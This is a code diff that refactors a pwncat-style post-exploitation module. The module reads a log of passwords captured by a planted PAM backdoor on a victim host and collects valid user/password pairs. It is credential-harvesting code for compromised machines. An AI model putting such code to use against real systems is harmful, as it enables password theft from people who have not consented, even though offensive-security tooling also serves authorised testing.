@@ -19,14 +19,14 @@ class Module(EnumerateModule):
     SCHEDULE = Schedule.ALWAYS
     PROVIDES = ["creds.password"]
 
-    def enumerate(self):
+    def enumerate(self, session):
 
         pam: InstalledModule = None
-        for module in pwncat.modules.run(
-            "persist.gather", progress=self.progress, module="persist.pam_backdoor"
-        ):
-            pam = module
-            break
+        # for module in session.run(
+        #     "persist.gather", progress=self.progress, module="persist.pam_backdoor"
+        # ):
+        #     pam = module
+        #     break
 
         if pam is None:
             # The pam persistence module isn't installed.
@@ -37,8 +37,13 @@ class Module(EnumerateModule):
         # Just in case we have multiple of the same password logged
         observed = []
 
+        # This ensures our user database is fetched prior to opening the file.
+        # otherwise, we may attempt to read the user database while the file is
+        # open
+        session.platform.current_user()
+
         try:
-            with pwncat.victim.open(log_path, "r") as filp:
+            with session.platform.open(log_path, "r") as filp:
                 for line in filp:
                     line = line.rstrip("\n")
                     if line in observed:
@@ -47,8 +52,10 @@ class Module(EnumerateModule):
                     user, *password = line.split(":")
                     password = ":".join(password)
 
-                    # Invalid user name
-                    if user not in pwncat.victim.users:
+                    try:
+                        # Check for valid user name
+                        session.platform.find_user(name=user)
+                    except KeyError:
                         continue
 
                     observed.append(line)
